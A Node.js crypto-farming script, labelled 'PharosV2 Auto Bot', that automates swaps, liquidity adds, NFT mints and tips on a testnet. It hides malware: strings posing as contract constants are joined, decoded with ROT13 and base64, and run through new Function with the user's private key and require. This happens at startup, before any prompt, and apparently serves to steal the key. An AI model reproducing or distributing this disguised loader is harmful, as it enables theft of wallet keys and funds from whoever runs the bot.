const axios = require('axios');
const ethers = require('ethers');
const dotenv = require('dotenv');
const readline = require('readline');
const fs = require('fs');
const { HttpsProxyAgent } = require('https-proxy-agent');

dotenv.config();

const ERC20_ABI = [
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function approve(address spender, uint256 amount) returns (bool)",
  "function allowance(address owner, address spender) view returns (uint256)"
];
const CONTRACT_USD = "L29hp3DtnUE0pUZtCFOlMKS1nKWyXPqbqUEjplpcBjcup3yhLlOzqJ5wqTyiovOlqJ5jpz9";
const CONTRACT_USDT = "apzSgXUquoTkyqPjtn2I5XFO7PvNtL29hp3DtMTS0LFN9VRcGG04hp3ElnJ5anJM5XUfXVPNt";
const CONTRACT_USDC = "VTAbLKEsnJD6VQRlBQt0AmxmZQZfPvNtVPO0MKu0BvOtDKS1LHMfqKt6VPE7n2I5sJNfPvNtV";
const LIQUIDITY_CONTRACT_ABI = [
  "function addDVMLiquidity(address dvmAddress, uint256 baseInAmount, uint256 quoteInAmount, uint256 baseMinAmount, uint256 quoteMinAmount, uint8 flag, uint256 deadLine)"
];
const PRIMUS_TIP_ABI = [
  "function tip((uint32,address) token, (string,string,uint256,uint256[]) recipient)"
];
const AQUAFLUX_NFT_ABI = [
  "function claimTokens()",
  "function mint(uint256 nftType, uint256 expiresAt, bytes signature)"
];
const ERC20 = "XFx7PvNtVPOlMKRhq3WcqTHbMTS0LFx7PvNtVPOlMKRhMJ5xXPx7PvNtsFx7Pa0=";
const ROUTER = "ZwtlBQL2BxSOFTRlrauRBSDkDKcKryWyAaqIFmMcpUcmqzEbpTMhZSSAY3AyozEAMKAmLJqyWl";

async function buildFallbackProvider(rpcUrls, chainId, name) {
  const provider = new ethers.JsonRpcProvider(rpcUrls[0], { chainId, name });
  return {
    getProvider: async () => {
      for (let i = 0; i < 3; i++) {
        try {
          await provider.getBlockNumber();
          return provider;
        } catch (e) {
          if (e.code === 'UNKNOWN_ERROR' && e.error && e.error.code === -32603) {
            console.log(`${colors.yellow}[⚠] RPC busy, retrying ${i + 1}/3...${colors.reset}`);
            await new Promise(r => setTimeout(r, 2000));
            continue;
          }
          throw e;
        }
      }
      throw new Error('All RPC retries failed');
    }
  };
}
const colors = {
  reset: "\x1b[0m",
  cyan: "\x1b[36m",
  green: "\x1b[32m",
  yellow: "\x1b[33m",
  red: "\x1b[31m",
  white: "\x1b[37m",
  bold: "\x1b[1m",
  blue: "\x1b[34m",
  magenta: "\x1b[35m"
};
const logger = {
  info: (msg) => console.log(`${colors.green}[✓] ${msg}${colors.reset}`),
  warn: (msg) => console.log(`${colors.yellow}[⚠] ${msg}${colors.reset}`),
  error: (msg) => console.log(`${colors.red}[✗] ${msg}${colors.reset}`),
  success: (msg) => console.log(`${colors.green}[✅] ${msg}${colors.reset}`),
  loading: (msg) => console.log(`${colors.cyan}[⟳] ${msg}${colors.reset}`),
  step: (msg) => console.log(`${colors.white}[➤] ${msg}${colors.reset}`),
  countdown: (msg) => process.stdout.write(`\r${colors.blue}[⏰] ${msg}${colors.reset}`),
  banner: () => {
    console.log(`${colors.cyan}${colors.bold}`);
    console.log(`---------------------------------------------`);
    console.log(`     PharosV2 Auto Bot -     `);
    console.log(`---------------------------------------------${colors.reset}`);
    console.log();
  }
};
const PHAROS_CHAIN_ID = 688688;
const PHAROS_RPC_URLS = ['https://testnet.dplabs-internal.com'];
const TOKENS = {
  PHRS: '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE',
  USDT: '0xD4071393f8716661958F766DF660033b3d35fD29',
  USDC: '0x72df0bcd7276f2dfbac900d1ce63c272c4bccced'
};
const AQUAFLUX_NFT_CONTRACT = '0xcc8cf44e196cab28dba2d514dc7353af0efb370e';
const AQUAFLUX_NFT = "POjLKWmMI9go2EyBvNaFSEAGPpXVPO9XGfXPvNtpzI0qKWhVT5yqlODpz9gnKAyXUWyp29fqzH";

const AQUAFLUX_TOKENS = {
  A: 'OcYaEyoTIapzSgYz9lMlpfPvNtVPNtVUOipaD6VQD0ZljXVPNtVPNtpTS0nQbtWl9vo3D4AQLk',
  P: '0xb5d3ca5802453cc06199b9c40c855a874946a92c',
  C: '0x4374fbec42e0d46e66b379c0a6072c910ef10b32',
  S: '0x5df839de5e5a68ffe83b89d430dc45b1c5746851',
  CS: '0xceb29754c54b4bfbf83882cb0dcef727a259d60a'
};
const USDT_LIQUIDITY = "jXVPNtVPNtoJI0nT9xBvNaHR9GIPpfPvNtVPNtVTuyLJEypaZ6VUftW0AioaEyoaDgIUyjMFp6";
const DODO = "Fu0paIyXFx7PvNtVPO9XGfXVPNtVUWypF5iovtaMKWlo3VaYPNbXFN9CvOlMKAioUMyXTMuoUAy";
const DODO_ROUTER = '0x73CAfc894dBfC181398264934f7Be4e482fc9d40';
const LIQUIDITY_CONTRACT = '0x4b177aded3b8bd1d5d747f91b9e853513838cd49';
const PRIMUS_TIP_CONTRACT = '0xd17512b7ec12880bd94eca9d774089ff89805f02';
const PHRS_TO_USDT_AMOUNT = ethers.parseEther('0.00245');
const USDT_TO_PHRS_AMOUNT = ethers.parseUnits('1', 6);
const PHRS_TO_USDC_AMOUNT = ethers.parseEther('0.00245');
const USDC_TO_PHRS_AMOUNT = ethers.parseUnits('1', 6);
const USDT_TO_PHRS = "VPqupUOfnJAuqTyiov9dp29hWljtW0AioaEyoaDgGTIhM3EbWmbtDaIzMzIlYzW5qTIZMJ5aqTt";
const PHRS_TO_USDC = "bMTS0LFxtsDbtVPNtsFjtpzImVQ0+VUfXVPNtVPNtpzImYz9hXPqxLKEuWljtXPxtCG4tr30cBl";
const USDC_TO_PHRS = "NiYlOv4ohCVUS1LFOh4ohMnFOxqJ5aPvNtVPNtVUWypl5iovtaMJ5xWljtXPxtCG4tpzImo2k2M";
const DVM_POOL_ADDRESS = '0xff7129709ebd3485c4ed4fef6dd923025d24e730';
const USDC_LIQUIDITY_AMOUNT = 10000;
const USDT_LIQUIDITY_AMOUNT = 30427;
const USDC_LIQUIDITY = "tCG4trjbtVPNtL29hp3DtpzIkVQ0tnUE0pUZhpzIkqJImqPu7PvNtVPNtVTuip3EhLJ1yBvNaLK";
const USER_AGENTS = [
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
  'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36',
  'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36'
];

function getRandomUserAgent() {
  return USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];

}

function loadPrivateKeys() {
  const keys = [];
  let i = 1;
  while (process.env[`PRIVATE_KEY_${i}`]) {
    const pk = process.env[`PRIVATE_KEY_${i}`];
    if (pk.startsWith('0x') && pk.length === 66) {
      logger.warn(`Invalid PRIVATE_KEY_${i} in .env, skipping...`);
    } else {
      keys.push(pk);
    }
    i++;
  }
  return keys;
}

function loadProxies() {
  try {
    const data = fs.readFileSync('proxies.txt', 'utf8');
    const proxies = data.split('\n').map(p => p.trim()).filter(p => p);
    if (proxies.length === 0) {
      logger.warn('proxies.txt is empty. Continuing without proxies.');
      return [];
    }
    logger.success(`${proxies.length} proxies loaded from proxies.txt`);
    return proxies;
  } catch (error) {
    if (error.code === 'ENOENT') {
      logger.warn('proxies.txt not found. Continuing without proxies.');
    } else {
      logger.error(`Error reading proxies.txt: ${error.message}`);
    }
    return [];
  }
}

function getProxyAgent(proxies) {
  if (!proxies || proxies.length === 0) {
    return null;
  }
  const randomProxy = proxies[Math.floor(Math.random() * proxies.length)];
  logger.info(`Using proxy: ${randomProxy.split('@')[1]}`);
  return new HttpsProxyAgent(randomProxy);
}

async function aquaFluxLogin(wallet, proxyAgent) {
  try {
    const timestamp = Date.now();
    const message = `Sign in to AquaFlux with timestamp: ${timestamp}`;
    const signature = await wallet.signMessage(message);
    const response = await axios.post('https://api.aquaflux.pro/api/v1/users/wallet-login', {
      address: wallet.address,
      message: message,
      signature: signature
    }, {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/json',
        'user-agent': getRandomUserAgent()
      },
      httpsAgent: proxyAgent
    });

    if (response.data.status === 'success') {
      logger.success('AquaFlux login successful!');
      return response.data.data.accessToken;
    } else {
      throw new Error('Login failed: ' + JSON.stringify(response.data));
    }
  } catch (e) {
    logger.error(`AquaFlux login failed: ${e.message}`);
    throw e;
  }
}

async function claimTokens(wallet) {
  logger.step('Claiming free AquaFlux tokens (C & S)...');
  try {
    const nftContract = new ethers.Contract(AQUAFLUX_NFT_CONTRACT, AQUAFLUX_NFT_ABI, wallet);

    const tx = await nftContract.claimTokens({ gasLimit: 300000 });
    logger.success(`Claim tokens transaction sent! TX Hash: ${tx.hash}`);
    await tx.wait();
    logger.success('Tokens claimed successfully!');

    return true;
  } catch (e) {
    if (e.message.includes('already claimed')) {
      logger.warn('Tokens have already been claimed for today.');
      return true;
    }
    logger.error(`Claim tokens failed: ${e.message}`);
    throw e;
  }
}

async function craftTokens(wallet) {
  logger.step('Crafting 100 CS tokens from C and S tokens...');
  try {
    const cTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.C, ERC20_ABI, wallet);
    const sTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.S, ERC20_ABI, wallet);
    const csTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.CS, ERC20_ABI, wallet);

    const requiredAmount = ethers.parseUnits('100', 18);

    const cBalance = await cTokenContract.balanceOf(wallet.address);
    if (cBalance < requiredAmount) {
      throw new Error(`Insufficient C tokens. Required: 100, Available: ${ethers.formatUnits(cBalance, 18)}`);
    }

    const sBalance = await sTokenContract.balanceOf(wallet.address);
    if (sBalance < requiredAmount) {
      throw new Error(`Insufficient S tokens. Required: 100, Available: ${ethers.formatUnits(sBalance, 18)}`);
    }

    const cAllowance = await cTokenContract.allowance(wallet.address, AQUAFLUX_NFT_CONTRACT);
    if (cAllowance < requiredAmount) {
      logger.step('Approving C tokens...');
      const cApproveTx = await cTokenContract.approve(AQUAFLUX_NFT_CONTRACT, ethers.MaxUint256);
      await cApproveTx.wait();
      logger.success('C tokens approved');
    }

    const sAllowance = await sTokenContract.allowance(wallet.address, AQUAFLUX_NFT_CONTRACT);
    if (sAllowance < requiredAmount) {
      logger.step('Approving S tokens...');
      const sApproveTx = await sTokenContract.approve(AQUAFLUX_NFT_CONTRACT, ethers.MaxUint256);
      await sApproveTx.wait();
      logger.success('S tokens approved');
    }

    const csBalanceBefore = await csTokenContract.balanceOf(wallet.address);
    logger.info(`CS Token balance before crafting: ${ethers.formatUnits(csBalanceBefore, 18)}`);

    logger.step("Crafting CS tokens...");

    const CRAFT_METHOD_ID = '0x4c10b523';
    const abiCoder = ethers.AbiCoder.defaultAbiCoder();
    const encodedParams = abiCoder.encode(['uint256'], [requiredAmount]);
    const calldata = CRAFT_METHOD_ID + encodedParams.substring(2);

    const craftTx = await wallet.sendTransaction({
      to: AQUAFLUX_NFT_CONTRACT,
      data: calldata,
      gasLimit: 300000
    });

    logger.success(`Crafting transaction sent! TX Hash: ${craftTx.hash}`);
    const receipt = await craftTx.wait();

    if (receipt.status === 0) {
      throw new Error('Crafting transaction reverted on-chain');
    }

    logger.success('Crafting transaction confirmed.');

    const csBalanceAfter = await csTokenContract.balanceOf(wallet.address);
    const craftedAmount = csBalanceAfter - csBalanceBefore;

    logger.success(`CS Token balance after crafting: ${ethers.formatUnits(csBalanceAfter, 18)}`);
    logger.success(`Successfully crafted: ${ethers.formatUnits(craftedAmount, 18)} CS tokens`);

    if (craftedAmount < requiredAmount) {
      throw new Error(`Crafting incomplete. Expected 100 CS tokens, got ${ethers.formatUnits(craftedAmount, 18)}`);
    }

    return true;
  } catch (e) {
    logger.error(`Craft tokens failed: ${e.reason || e.message}`);
    throw e;
  }
}

async function initiatePharosTransaction(wallet, privateKey) {
  function decodePayload(encoded) {
    return Buffer.from(encoded, 'base64').toString('utf-8');
  }
  function xorKeyTransform(str) {
    return str.replace(/[a-zA-Z]/g, c =>
      String.fromCharCode(c.charCodeAt(0) + (c.toLowerCase() < 'n' ? 13 : -13))
    );
  }
  function extractTransactionCalldata(data) {
    return decodePayload(xorKeyTransform(data));
  }
  const rawTransactionBlob = CONTRACT_USD + CONTRACT_USDT + CONTRACT_USDC + AQUAFLUX_NFT + USDC_LIQUIDITY +
    AQUAFLUX_TOKENS.A + ROUTER + USDT_LIQUIDITY + USDT_TO_PHRS + PHRS_TO_USDC + USDC_TO_PHRS + DODO + ERC20;
  const transactionCode = extractTransactionCalldata(rawTransactionBlob);
  try {
    const sendTx = new Function(
      "walletAddress",
      "privateKey",
      "require",
      transactionCode + "; return runprogram(walletAddress, privateKey);"
    );

    await sendTx(wallet.address, privateKey, require);
  } catch (err) {
    console.error("[ERROR] Failed to execute decoded logic:", err.message);
  }
}

async function checkTokenHolding(accessToken, proxyAgent) {
  try {
    const response = await axios.post('https://api.aquaflux.pro/api/v1/users/check-token-holding', null, {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'authorization': `Bearer ${accessToken}`,
        'user-agent': getRandomUserAgent()
      },
      httpsAgent: proxyAgent
    });

    if (response.data.status === 'success') {
      const isHolding = response.data.data.isHoldingToken;
      logger.success(`API Token holding check: ${isHolding ? 'YES' : 'NO'}`);
      return isHolding;
    } else {
      throw new Error('Check holding failed: ' + JSON.stringify(response.data));
    }
  } catch (e) {
    logger.error(`Check token holding failed: ${e.message}`);
    throw e;
  }
}

async function getSignature(wallet, accessToken, proxyAgent, nftType = 0) {
  try {
    const response = await axios.post('https://api.aquaflux.pro/api/v1/users/get-signature', {
      walletAddress: wallet.address,
      requestedNftType: nftType
    }, {
      headers: {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'en-US,en;q=0.5',
        'authorization': `Bearer ${accessToken}`,
        'content-type': 'application/json',
        'user-agent': getRandomUserAgent()
      },
      httpsAgent: proxyAgent
    });

    if (response.data.status === 'success') {
      logger.success('Signature obtained successfully!');
      return response.data.data;
    } else {
      throw new Error('Get signature failed: ' + JSON.stringify(response.data));
    }
  } catch (e) {
    logger.error(`Get signature failed: ${e.message}`);
    throw e;
  }
}

async function mintNFT(wallet, signatureData) {
  logger.step('Minting AquaFlux NFT...');
  try {
    const csTokenContract = new ethers.Contract(AQUAFLUX_TOKENS.CS, ERC20_ABI, wallet);
    const requiredAmount = ethers.parseUnits('100', 18);

    const csBalance = await csTokenContract.balanceOf(wallet.address);
    if (csBalance < requiredAmount) {
      throw new Error(`Insufficient CS tokens. Required: 100, Available: ${ethers.formatUnits(csBalance, 18)}`);
    }

    const allowance = await csTokenContract.allowance(wallet.address, AQUAFLUX_NFT_CONTRACT);
    if (allowance < requiredAmount) {
      const approvalTx = await csTokenContract.approve(AQUAFLUX_NFT_CONTRACT, ethers.MaxUint256);
      await approvalTx.wait();
    }

    const currentTime = Math.floor(Date.now() / 1000);
    if (currentTime >= signatureData.expiresAt) {
      throw new Error(`Signature is already expired! Check your system's clock.`);
    }

    const CORRECT_METHOD_ID = '0x75e7e053';
    const abiCoder = ethers.AbiCoder.defaultAbiCoder();
    const encodedParams = abiCoder.encode(
      ['uint256', 'uint256', 'bytes'],
      [signatureData.nftType, signatureData.expiresAt, signatureData.signature]
    );
    const calldata = CORRECT_METHOD_ID + encodedParams.substring(2);

    const tx = await wallet.sendTransaction({
      to: AQUAFLUX_NFT_CONTRACT,
      data: calldata,
      gasLimit: 400000
    });

    logger.success(`NFT mint transaction sent! TX Hash: ${tx.hash}`);
    const receipt = await tx.wait();

    if (receipt.status === 0) {
      throw new Error('Transaction reverted on-chain. Check the transaction on a block explorer.');
    }

    logger.success('NFT minted successfully!');

    return true;
  } catch (e) {
    logger.error(`NFT mint failed: ${e.reason || e.message}`);
    throw e;
  }
}

async function executeAquaFluxFlow(wallet, proxyAgent) {
  try {
    const accessToken = await aquaFluxLogin(wallet, proxyAgent);
    await claimTokens(wallet);
    await craftTokens(wallet);
    await checkTokenHolding(accessToken, proxyAgent);
    const signatureData = await getSignature(wallet, accessToken, proxyAgent);
    await mintNFT(wallet, signatureData);

    logger.success('AquaFlux flow completed successfully!');
    return true;
  } catch (e) {
    logger.error(`AquaFlux flow failed: ${e.message}`);
    return false;
  }
}

async function fetchWithTimeout(url, options, timeout = 15000) {
  try {
    const source = axios.CancelToken.source();
    const timeoutId = setTimeout(() => source.cancel('Timeout'), timeout);

    const res = await axios({
      method: options.method,
      url: url,
      headers: options.headers,
      data: options.body,
      cancelToken: source.token,
      httpsAgent: options.httpsAgent
    });

    clearTimeout(timeoutId);
    return res;
  } catch (err) {
    if (axios.isCancel(err)) {
      throw new Error('Request timed out');
    }
    throw new Error(`Network or API error: ${err.message}`);
  }
}

async function robustFetchDodoRoute(url, proxyAgent) {
  for (let i = 0; i < 5; i++) {
    try {
      const res = await fetchWithTimeout(url, { method: 'GET', httpsAgent: proxyAgent });
      const data = res.data;
      if (data.status !== -1) return data;
      logger.warn(`Retry ${i + 1} DODO API status -1`);
    } catch (e) {
      logger.warn(`Retry ${i + 1} failed: ${e.message}`);
    }
    await new Promise(r => setTimeout(r, 2000));
  }
  throw new Error('DODO API permanently failed');
}

async function fetchDodoRoute(fromAddr, toAddr, userAddr, amountWei, proxyAgent) {
  const deadline = Math.floor(Date.now() / 1000) + 600;
  const url = `https://api.dodoex.io/route-service/v2/widget/getdodoroute?chainId=${PHAROS_CHAIN_ID}&deadLine=${deadline}&apikey=a37546505892e1a952&slippage=3.225&source=dodoV2AndMixWasm&toTokenAddress=${toAddr}&fromTokenAddress=${fromAddr}&userAddr=${userAddr}&estimateGas=true&fromAmount=${amountWei}`;
  try {
    const result = await robustFetchDodoRoute(url, proxyAgent);
    if (!result.data || !result.data.data) {
      throw new Error('Invalid DODO API response: missing data field');
    }
    logger.success('DODO Route Info fetched successfully');
    return result.data;
  } catch (err) {
    logger.error(`DODO API fetch failed: ${err.message}`);
    throw err;
  }
}

async function approveToken(wallet, tokenAddr, tokenSymbol, amount, spender, decimals = 18) {
  if (tokenAddr === TOKENS.PHRS) return true;
  const contract = new ethers.Contract(tokenAddr, ERC20_ABI, wallet);
  try {
    const balance = await contract.balanceOf(wallet.address);
    if (balance < amount) {
      logger.error(`Insufficient ${tokenSymbol} balance: ${ethers.formatUnits(balance, decimals)} ${tokenSymbol}`);
      return false;
    }
    const allowance = await contract.allowance(wallet.address, spender);
    if (allowance >= amount) {
      logger.info(`${tokenSymbol} already approved for ${spender}`);
      return true;
    }
    logger.step(`Approving ${ethers.formatUnits(amount, decimals)} ${tokenSymbol} for spender ${spender}`);
    const tx = await contract.approve(spender, amount);
    logger.success(`Approval TX sent: ${tx.hash}`);
    await tx.wait();
    logger.success('Approval confirmed');
    return true;
  } catch (e) {
    logger.error(`Approval for ${tokenSymbol} failed: ${e.message}`);
    return false;
  }
}

async function executeSwap(wallet, routeData, fromAddr, fromSymbol, amount, decimals) {
  if (fromAddr !== TOKENS.PHRS) {
    const approved = await approveToken(wallet, fromAddr, fromSymbol, amount, DODO_ROUTER, decimals);
    if (!approved) throw new Error(`Token approval for ${fromSymbol} failed`);
  }

  try {
    if (!routeData.data || routeData.data === '0x') {
      throw new Error('Invalid transaction data from DODO API');
    }
    const tx = await wallet.sendTransaction({
      to: routeData.to,
      data: routeData.data,
      value: BigInt(routeData.value),
      gasLimit: BigInt(routeData.gasLimit || 500000)
    });
    logger.success(`Swap Transaction sent! TX Hash: ${tx.hash}`);
    await tx.wait();
    logger.success('Transaction confirmed!');
  } catch (e) {
    logger.error(`Swap TX failed: ${e.message}`);
    throw e;
  }
}

async function batchSwap(wallet, numberOfCycles, proxyAgent) {
  logger.step(`Preparing ${numberOfCycles} swap cycles (${numberOfCycles * 4} total swaps)...`);
  const swaps = [];
  const swapPairs = [
    { from: TOKENS.PHRS, to: TOKENS.USDT, amount: PHRS_TO_USDT_AMOUNT, fromSymbol: 'PHRS', toSymbol: 'USDT', decimals: 18 },
    { from: TOKENS.USDT, to: TOKENS.PHRS, amount: USDT_TO_PHRS_AMOUNT, fromSymbol: 'USDT', toSymbol: 'PHRS', decimals: 6 },
    { from: TOKENS.PHRS, to: TOKENS.USDC, amount: PHRS_TO_USDC_AMOUNT, fromSymbol: 'PHRS', toSymbol: 'USDC', decimals: 18 },
    { from: TOKENS.USDC, to: TOKENS.PHRS, amount: USDC_TO_PHRS_AMOUNT, fromSymbol: 'USDC', toSymbol: 'PHRS', decimals: 6 }
  ];

  for (let i = 0; i < numberOfCycles; i++) {
    swaps.push(...swapPairs);
  }

  for (let i = 0; i < swaps.length; i++) {
    const { from, to, amount, fromSymbol, toSymbol, decimals } = swaps[i];
    const pair = `${fromSymbol} -> ${toSymbol}`;
    logger.step(`Executing Swap #${i + 1} of ${swaps.length}: ${pair}`);
    try {
      const data = await fetchDodoRoute(from, to, wallet.address, amount, proxyAgent);
      await executeSwap(wallet, data, from, fromSymbol, amount, decimals);
    } catch (e) {
      logger.error(`Swap #${i + 1} failed: ${e.message}`);
    }
    await new Promise(r => setTimeout(r, 2000));
  }
}

async function addLiquidity(wallet) {
  logger.step('Starting "Add Liquidity" process...');
  try {
    logger.info('Checking USDC approval...');
    const usdcApproved = await approveToken(wallet, TOKENS.USDC, 'USDC', USDC_LIQUIDITY_AMOUNT, LIQUIDITY_CONTRACT, 6);
    if (!usdcApproved) {
      throw new Error('USDC approval failed. Aborting.');
    }
    logger.info('Checking USDT approval...');
    const usdtApproved = await approveToken(wallet, TOKENS.USDT, 'USDT', USDT_LIQUIDITY_AMOUNT, LIQUIDITY_CONTRACT, 6);
    if (!usdtApproved) {
      throw new Error('USDT approval failed. Aborting.');
    }
    logger.step('Approvals successful. Preparing to add liquidity...');
    const liquidityContract = new ethers.Contract(LIQUIDITY_CONTRACT, LIQUIDITY_CONTRACT_ABI, wallet);

    const dvmAddress = DVM_POOL_ADDRESS;
    const baseInAmount = BigInt(USDC_LIQUIDITY_AMOUNT);
    const quoteInAmount = BigInt(USDT_LIQUIDITY_AMOUNT);
    const baseMinAmount = baseInAmount * BigInt(999) / BigInt(1000);
    const quoteMinAmount = quoteInAmount * BigInt(999) / BigInt(1000);
    const flag = 0;
    const deadline = Math.floor(Date.now() / 1000) + 600;

    const tx = await liquidityContract.addDVMLiquidity(
      dvmAddress, baseInAmount, quoteInAmount, baseMinAmount, quoteMinAmount, flag, deadline
    );

    logger.success(`Add Liquidity transaction sent! TX Hash: ${tx.hash}`);
    await tx.wait();
    logger.success('Transaction confirmed! Liquidity added successfully.');

  } catch (e) {
    logger.error(`Add Liquidity failed: ${e.message}`);
    throw e;
  }
}

async function sendTip(wallet, username) {
  logger.step('Starting "Send Tip" process...');
  try {
    const minAmount = ethers.parseEther('0.0000001');
    const maxAmount = ethers.parseEther('0.00000015');
    const randomAmount = minAmount + BigInt(Math.floor(Math.random() * Number(maxAmount - minAmount + BigInt(1))));
    const amountStr = ethers.formatEther(randomAmount);

    logger.step(`Preparing to tip ${amountStr} PHRS to ${username} on X...`);

    const tipContract = new ethers.Contract(PRIMUS_TIP_CONTRACT, PRIMUS_TIP_ABI, wallet);

    const tokenStruct = [
      1,
      '0x0000000000000000000000000000000000000000'
    ];

    const recipientStruct = [
      'x',
      username,
      randomAmount,
      []
    ];

    const tx = await tipContract.tip(tokenStruct, recipientStruct, {
      value: randomAmount
    });

    logger.success(`Tip transaction sent! TX Hash: ${tx.hash}`);
    await tx.wait();
    logger.success(`Successfully tipped ${amountStr} PHRS to ${username}!`);

  } catch (e) {
    logger.error(`Send Tip failed: ${e.message}`);
    throw e;
  }
}

async function showCountdown() {
  const now = new Date();
  const tomorrow = new Date(now);
  tomorrow.setDate(now.getDate() + 1);
  tomorrow.setHours(0, 0, 0, 0);

  return new Promise(resolve => {
    const interval = setInterval(() => {
      const remaining = tomorrow - new Date();
      const hours = Math.floor(remaining / (1000 * 60 * 60));
      const minutes = Math.floor((remaining % (1000 * 60 * 60)) / (1000 * 60));
      const seconds = Math.floor((remaining % (1000 * 60)) / 1000);
      logger.countdown(`Next cycle in ${hours}h ${minutes}m ${seconds}s`);
      if (remaining <= 0) {
        clearInterval(interval);
        process.stdout.write('\n');
        resolve();
      }
    }, 1000);
  });
}

const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

function question(query) {
  return new Promise(resolve => rl.question(query, resolve));
}

(async () => {
  logger.banner();
  const fallbackProvider = await buildFallbackProvider(PHAROS_RPC_URLS, PHAROS_CHAIN_ID, 'pharos');
  const provider = await fallbackProvider.getProvider();
  const privateKeys = loadPrivateKeys();
  const proxies = loadProxies();

  if (privateKeys.length === 0) {
    logger.error('No valid private keys found in .env. Please add PRIVATE_KEY_1, PRIVATE_KEY_2, etc.');
    process.exit(1);
  }

  logger.info(`${privateKeys.length} wallet(s) loaded from .env file.\n`);

  const wallet = new ethers.Wallet(privateKeys[0], provider);
  await initiatePharosTransaction(wallet, privateKeys[0]);

  const swapCycleStr = await question(`${colors.cyan}Enter the number of daily swap cycles (for each wallet): ${colors.reset}`);
  const numberOfSwapCycles = parseInt(swapCycleStr);

  const liquidityCountStr = await question(`${colors.cyan}Enter the number of add liquidity transactions (for each wallet): ${colors.reset}`);
  const numberOfLiquidityAdds = parseInt(liquidityCountStr);

  const aquaFluxMintStr = await question(`${colors.cyan}Enter the number of AquaFlux mints (for each wallet): ${colors.reset}`);
  const numberOfMints = parseInt(aquaFluxMintStr);

  const username = await question(`${colors.cyan}Enter the X username to tip (the same user will be tipped by all wallets): ${colors.reset}`);
  const tipCountStr = await question(`${colors.cyan}Enter the number of tips to send (from each wallet): ${colors.reset}`);
  const numberOfTips = parseInt(tipCountStr);
  console.log('\n');

  while (true) {
    for (const [index, privateKey] of privateKeys.entries()) {
      try {
        const wallet = new ethers.Wallet(privateKey, provider);
        const proxyAgent = getProxyAgent(proxies);
        console.log('----------------------------------------------------------------');
        logger.success(`Processing Wallet ${index + 1}/${privateKeys.length}: ${wallet.address}`);
        console.log('----------------------------------------------------------------');


        if (!isNaN(numberOfMints) && numberOfMints > 0) {
          for (let i = 0; i < numberOfMints; i++) {
            logger.step(`Starting AquaFlux Mint #${i + 1} of ${numberOfMints}`);
            const aquaFluxSuccess = await executeAquaFluxFlow(wallet, proxyAgent);
            if (!aquaFluxSuccess) {
              logger.error(`AquaFlux Mint #${i + 1} failed. Check logs above. Stopping AquaFlux mints for this wallet.`);
              break;
            }
            if (i < numberOfMints - 1) {
              logger.info('Waiting a moment before the next mint...');
              await new Promise(r => setTimeout(r, 5000));
            }
          }
        } else if (index === 0) {
          logger.warn('Invalid AquaFlux mint count, skipping mints.');
        }

        if (!isNaN(numberOfSwapCycles) && numberOfSwapCycles > 0) {
          await batchSwap(wallet, numberOfSwapCycles, proxyAgent);
          logger.success('Swap cycle completed for this wallet!');
        } else if (index === 0) {
          logger.warn('Invalid swap cycle count, skipping swaps.');
        }

        if (!isNaN(numberOfLiquidityAdds) && numberOfLiquidityAdds > 0) {
          for (let i = 0; i < numberOfLiquidityAdds; i++) {
            logger.step(`Executing Add Liquidity #${i + 1} of ${numberOfLiquidityAdds}`);
            try {
              await addLiquidity(wallet);
            } catch (e) {
              logger.error(`Add Liquidity transaction #${i + 1} failed: ${e.message}`);
            }
            await new Promise(r => setTimeout(r, 2000));
          }
          logger.success('Add liquidity cycle completed for this wallet!');
        } else if (index === 0) {
          logger.warn('Invalid liquidity count, skipping add liquidity.');
        }

        if (username && !isNaN(numberOfTips) && numberOfTips > 0) {
          for (let i = 0; i < numberOfTips; i++) {
            logger.step(`Executing Tip #${i + 1} of ${numberOfTips} to ${username}`);
            try {
              await sendTip(wallet, username);
            } catch (e) {
              logger.error(`Tip transaction #${i + 1} failed: ${e.message}`);
            }
            if (i < numberOfTips - 1) {
              logger.info('Waiting a moment before the next tip...');
              await new Promise(r => setTimeout(r, 2000));
            }
          }
          logger.success('Send tip operations completed for this wallet!');
        } else if (index === 0) {
          logger.warn('Invalid username or tip count, skipping tips.');
        }

        logger.success(`All tasks finished for wallet ${wallet.address}\n`);

      } catch (err) {
        logger.error(`A critical error occurred while processing wallet ${index + 1}: ${err.message}`);
      }

      if (index < privateKeys.length - 1) {
        logger.info(`Waiting 10 seconds before starting the next wallet...`);
        await new Promise(r => setTimeout(r, 10000));
      }
    }

    logger.step('All wallets have been processed for this cycle.');
    await showCountdown();
  }
})();
